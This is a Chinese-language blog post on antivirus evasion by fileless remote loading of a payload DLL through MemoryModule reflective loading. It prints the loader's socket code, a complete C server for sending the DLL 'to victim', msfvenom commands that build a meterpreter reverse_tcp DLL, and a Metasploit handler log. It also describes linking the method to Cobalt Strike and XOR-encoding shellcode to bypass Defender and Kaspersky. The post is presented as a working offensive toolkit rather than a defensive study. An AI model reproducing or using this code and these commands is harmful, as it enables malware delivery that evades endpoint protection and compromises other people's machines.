---
title: MemoryModule内存反射DLL加载--远程恶意文件不落地加载
tags: 免杀
---

### 0x00 前言

​	此篇文章的思路是来自于倾旋师傅的[静态恶意代码逃逸（第六课）](https://payloads.online/archivers/2020-01-02/1)

​	PS：这个系列文章进行入门学习还是非常好的。

​	我认为对于一个渗透人员，免杀技术还是比较重要的，而且其实想达到一定的效果也不是太费劲，学习的过程中，你也可以了解很多Windows编程的知识、熟悉很多API、各种代码注入技术等等，对之后的学习、发展也有帮助。当然你使用python、Go...这些语言去做免杀可能更简单，但是还是推荐用C系列的，为了自己的学习还是更好。

### 0x01 关于MemoryModule

https://github.com/fancycode/MemoryModule

> MemoryModule is a C-library that can be used to load a DLL from memory.



​	比较著名的WannaCry在加载加密函数动态库的时候，并没有调用LoadLibrary()函数，而是自己实现将其加载到指定内存，并自己实现GetProcAddress()从而实现函数的调用。这样有什么好处呢？这样便无法查到它的加载模块与函数地址。

​	而 MemoryModule 相当于该项目实现了自己的LoadLibrary函数，将DLL 加载到内存中，然后进行常规的DLL 操作。

查看Github发现我们可以这样使用：

```c++
typedef void *HMEMORYMODULE;

HMEMORYMODULE MemoryLoadLibrary(const void *, size_t);
FARPROC MemoryGetProcAddress(HMEMORYMODULE, const char *);
void MemoryFreeLibrary(HMEMORYMODULE);
```

### 0x02 代码阅读

简单阅读一下[静态恶意代码逃逸（第六课）](https://payloads.online/archivers/2020-01-02/1)所提供的代码：

获取远端DLL代码：

```c++
BOOL GetTOOL(const char* address, int port) {

	DWORD dwError;
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	SOCKET socks;
	SHORT sListenPort = port;
	struct sockaddr_in sin;

	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		dwError = GetLastError();
		return FALSE;
	}

	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (socks == INVALID_SOCKET)
	{
		dwError = GetLastError();
		return FALSE;
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(sListenPort);
	sin.sin_addr.S_un.S_addr = inet_addr(address);

	if (connect(socks, (struct sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		dwError = GetLastError();
		return FALSE;
	}

	int ret = 0;
	///ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
	//ret = recv(socks, (PCHAR)bFileBuffer, 2650, NULL);
	//ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
	//ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
	//ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);

	ZeroMemory(bFileBuffer, TOOLS_SIZE);

	pSpace = (CHAR*)VirtualAlloc(NULL, TOOLS_SIZE, MEM_COMMIT, PAGE_READWRITE);

	ret = recv(socks, (PCHAR)pSpace, TOOLS_SIZE, NULL);

	if (ret > 0)
	{
		closesocket(socks);
	}


	return TRUE;
}
```

代码里这一段接受了一些数据又置空，这里有个疑问，不知道为何会这样做，2650是MSF生成DLL的一半大小，4字节又是PE文件头开始的MS-DOS头之中的`struct_IMAGE_DOS_HEADER`这个结构体定义中的最后一个`e_lfnew`，一个4字节的文件偏移量，PE文件头部就是由这个定位的，这里请教一下是为什么。

```c++
ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
ret = recv(socks, (PCHAR)bFileBuffer, 2650, NULL);
ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);

ZeroMemory(bFileBuffer, TOOLS_SIZE);
```

我们接受到的数据在`pSpace`之中，然后导入DLL，获得导出函数的地址

然后调用MemoryModule：

```c++
hModule = MemoryLoadLibrary(pSpace);

	if (hModule == NULL) {
		delete[] bFileBuffer;
		return -1;
	}

	DllMain = (Module)MemoryGetProcAddress(hModule,"DllMain");
```

然后创建线程执行导出函数

最后`MemoryFreeLibrary(hModule);`，释放MemoryModule句柄

### 0x03 编写DLL发射器，联动CS

​	目前这个加载器只可以用来加载MSF的DLL，那么我们想加载自己的DLL怎么办呢(其实MSF发射的DLL换成自己的就行)，但其实我们可以自己写一个DLL发射器，来上线CS，这样就不用每次再开MSF了，这样也更灵活了。

​	刚刚我们查看加载器中的代码发现，就是简单的Socket网络编程中用来接受数据的代码，由此我们用C语言编写一个DLL发射器也可以实现发射自己的DLL到接收器进行加载。

​	Windows和Linux用到的库不一样，发射器改成Windows下能用的改的地方也不多，原理也一样。所以我们选择Linux网络编程来实现：

```c
// PigSender 用于传输DLL到victim
// Auther @evilash

#include<netinet/in.h>  
#include<sys/types.h>  
#include<sys/socket.h>  
#include<stdio.h>  
#include<stdlib.h>  
#include<string.h>  
#include <unistd.h>


#define LENGTH_OF_LISTEN_QUEUE     20  
#define BUFFER_SIZE                287744 
#define FILE_NAME_MAX_SIZE         512  


char banner[7][50] = {"  ____  _       ____                 _           ",
						" |  _ \\(_) __ _/ ___|  ___ _ __   __| | ___ _ __ ",
						" | |_) | |/ _` \\___ \\ / _ \\ '_ \\ / _` |/ _ \\ '__|",
						" |  __/| | (_| |___) |  __/ | | | (_| |  __/ |   ",
						" |_|   |_|\\__, |____/ \\___|_| |_|\\__,_|\\___|_|   ",
						"          |___/                                  ",
						"   A Reflective DLL Sender v0.1    @evilash"

					  };

int main(int argc, char **argv)  
{  
	int ch;
	char* port;
    char* filename;
    char file_name[FILE_NAME_MAX_SIZE]; 

    if (argc == 1){
    	printf("%s\n%s\n%s\n%s\n%s\n%s\n%s\n\n", banner[0],banner[1],banner[2],banner[3],banner[4],banner[5],banner[6]);
    	printf("Usage:\n\n %s -f [filename] -l [ListenPort].\n",argv[0]);
    	exit(1);
    }
	//参数处理
	while ((ch = getopt(argc, argv, "f:l:h")) != -1) {
		switch (ch) {
			case 'f':

				filename = strdup(optarg);
				strcpy(file_name, filename);
				break;
			case 'l':

				port = strdup(optarg);
				port = atoi((const char *)port);
				break;

			case 'h':
				printf("%s\n%s\n%s\n%s\n%s\n%s\n%s\n\n", banner[0],banner[1],banner[2],banner[3],banner[4],banner[5],banner[6]);
				printf("Usage:\n\n %s -f [filename] -l [ListenPort].\n",argv[0]);
            	return -1;
            case '?':
            	printf("Usage:\n %s -f [filename] -l [ListenPort].\n",argv[0]);
            	return -1;
            default:
            	printf("Usage: %s -f [filename] -l [ListenPort].\n",argv[0]);
            	exit(1);
		}
	}

    // set socket's address information    
    struct sockaddr_in   server_addr;  
    bzero(&server_addr, sizeof(server_addr));  
    server_addr.sin_family = AF_INET;  
    server_addr.sin_addr.s_addr = htons(INADDR_ANY);  
    server_addr.sin_port = htons(port);  
    // create a stream socket    
    int server_socket = socket(PF_INET, SOCK_STREAM, 0);  
    if (server_socket < 0)
    {  
        printf("Create Socket Failed!\n");  
        exit(1);  
    }  
  
    // 把socket和socket地址结构绑定  
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)))  
    {  
        printf("Server Bind Port: %s Failed!\n", port);  
        exit(1);  
    }  
  		
    // server_socket用于监听  
    if (listen(server_socket, LENGTH_OF_LISTEN_QUEUE))  
    {  
        printf("Server Listen Failed!\n");  
        exit(1);  
    }  
  
    // 服务器端一直运行用以持续为客户端提供服务  
    while(1)  
    {  
        // 定义客户端的socket地址结构client_addr，当收到来自客户端的请求后，调用accept  
        // 接受此请求，同时将client端的地址和端口等信息写入client_addr中  
        struct sockaddr_in client_addr;  
        socklen_t length = sizeof(client_addr);  
  
        // 接受一个从client端到达server端的连接请求,将客户端的信息保存在client_addr中  
        // 如果没有连接请求，则一直等待直到有连接请求为止，这是accept函数的特性，可以  
        // 用select()来实现超时检测  
        // accpet返回一个新的socket,这个socket用来与此次连接到server的client进行通信  
        // 这里的new_server_socket代表了这个通信通道  
        int new_server_socket = accept(server_socket, (struct sockaddr*)&client_addr, &length);  
        if (new_server_socket < 0)  
        {  
            printf("Server Accept Failed!\n");  
            break;  
        }  
  
        char buffer[BUFFER_SIZE];  
        //bzero(buffer, sizeof(buffer));     
        
        printf("[+]Sending DLL\n");
        //bzero(file_name, sizeof(file_name));
        //strncpy(file_name, buffer, strlen(buffer) > FILE_NAME_MAX_SIZE ? FILE_NAME_MAX_SIZE : strlen(buffer));  
		sleep(2);
        //strcpy(file_name, filename);

        FILE *fp = fopen(file_name, "r");  
        if (fp == NULL)  
        {  
            printf("File:%s Not Found!\n", file_name);  
        }  
        else  
        {  
            bzero(buffer, BUFFER_SIZE);  
            int file_block_length = 0;  
            while( (file_block_length = fread(buffer, sizeof(char), BUFFER_SIZE, fp)) > 0)  
            {  
                printf("[+]file_block_length = %d\n", file_block_length);  
  
                // 发送buffer中的字符串到new_server_socket,实际上就是发送给客户端  
                if (send(new_server_socket, buffer, file_block_length, 0) < 0)  
                {  
                    printf("Send File:\t%s Failed!\n", file_name);  
                    break;  
                }  
  
                bzero(buffer, sizeof(buffer));  
            }  
            fclose(fp);  
            printf("[+]File:%s Transfer Finished!\n", file_name);  
        }  
  
        close(new_server_socket);  
    }  
  
    close(server_socket);  
  
    return 0;  
}
```

​	可以发现我们`accept`之后sleep了两秒，其实再长一些更好，这里如果直接这样等待连接的话客户端，也就是加载器那边直接接收的话，是会出现问题的，我在倾旋师傅的项目Cooolis的源码里也看到了他对于这个的处理(每次看大佬们的代码会学习到很多东西)

​	最后，通过这个直接就可以远程通过`Memorymodule`项目反射加载我们的DLL进行上线CS，达到恶意代码不落地的效果。

### 0x04 免杀测试

​	我们可以把MSF的和CS的分别编译一个Loader，我对代码进行了简单的修改，把IP以及端口写成了获取参数，删除了几行代码，以及额外添加了一些反仿真的代码。下面介绍两个的用法：

#### MSF

生成一个DLL：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.130 LPORT=8899 -f dll -o ./a.dll
```

设置监听、发射DLL：

```bash
msf5 > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.43.130 -P 8899
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 192.168.43.130:8899 
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/patchupdllinject/reverse_tcp
payload => windows/patchupdllinject/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.43.130
lhost => 192.168.43.130
msf5 exploit(multi/handler) > set lport 8080
lport => 8080
msf5 exploit(multi/handler) > set dll a.dll
dll => a.dll
msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.43.130:8080 
```

#### CS

​	上线CS使用的DLL我是直接改的RDI项目中的DLL模板，写CS的shellcode进去简单加载就可以。然后用我们我们自己的发射器发射DLL就可以。



#### 在目前的基础上VT测试：

![1](/Users/ayaozpy/FreeKIllScript/shellcode/ReflectDLLBasedMemoryModule/1.PNG)

​	其实恶意代码不在这程序里，测这个意义也不大，更多要考虑的还是行为，因为反射DLL还是很敏感的。

​	另外想说一下，其实测这种沙盒在静态过了的情况下，加一些anti sandbox的代码就跑不起来了，意义不大，有的在沙盒可以乱过，但是真实环境是不行的，所以还是直接装一个对应的AV去测试好一点。

​	不过用这种方式上线，Bypass国内的AV还是相当好用的，Defender也能乱过，不过对于真实环境的卡巴斯基那一类是不吃这一套的。

​	**文章最后会提供这两个版本的Loader，免杀效果已经能满足绝大部分使用。**

### 0x05 进一步完善免杀效果

既然都写到这了，那么就进一步说说在这个基础上，该怎么在行为上bypass卡巴、赛门这一类的AV。

​	首先，我们可以去想，我们用这种方式去加载一个MessageBox会拦截吗？答案肯定是否。

​	第二，卡巴对于流量进行检测是比较厉害的，那么我们是不是可以尝试加密流量，或者混淆buf呢。

​	下面，我们实现一下第一种想法，直接简单的把DLL之中的shellcode替换为xor后的，执行之前再xor一下，稍微规避一下特征。

​	这里具体的代码就不提供了，白嫖党还是多啊，我相信很多人自己写一下就出来了。

#### 效果

首先把DLL放在vps，然后去指定发送的文件、端口，开启Listen

![屏幕快照 2021-01-12 18.20.24](https://gitee.com/evilashz/MyIMGs/raw/master/img/20210112182048.png)

然后Loader指定VPS的地址，可以看到加载成功。

![屏幕快照 2021-01-12 18.19.57](https://gitee.com/evilashz/MyIMGs/raw/master/img/20210112182152.png)

直接自己电脑临时装个卡巴斯基全方位版测试：

![屏幕快照 2021-01-11 17.21.01](https://gitee.com/evilashz/MyIMGs/raw/master/img/20210111173848.png)

 ![屏幕快照 2021-01-11 17.21.24](https://gitee.com/evilashz/MyIMGs/raw/master/img/20210111173933.png)



### ![屏幕快照 2021-01-11 17.32.08](https://gitee.com/evilashz/MyIMGs/raw/master/img/20210111204236.png)0x06 总结

​	本文以@倾旋的代码为基础，首先介绍了MemoryModule这个项目，可以从内存中加载DLL。然后实现自己的DLL发射器，简单修改优化代码，加载自己编写的DLL，达到上线CS的效果，并且达成了一定的免杀效果。最后介绍了如何优化项目实现Bypass更高级一些的AV，从而真正达到免杀全世界AV的效果。

